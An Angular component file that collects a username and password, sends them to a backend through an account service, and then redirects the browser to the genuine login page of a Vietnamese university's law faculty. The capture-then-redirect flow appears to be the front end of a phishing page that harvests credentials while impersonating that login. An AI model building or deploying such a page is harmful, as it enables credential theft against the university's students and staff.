import { Component, OnInit } from '@angular/core';
import { AccountService} from '../account.service';

@Component({
  selector: 'app-law',
  templateUrl: './law.component.html',
  styleUrls: ['./law.component.css']
})
export class LawComponent implements OnInit {

  constructor(private accountService: AccountService) { }

  ngOnInit(): void {
  }

  accountData = {
    username: '',
    password: ''
  }

  sendData() {
    this.accountService.createAccount(this.accountData)
      .subscribe(
        data => {
          window.location.href = 'https://law.vnu.edu.vn/Login.aspx';
        },
        error => {
          console.log(error);
        }
      )
  }

}
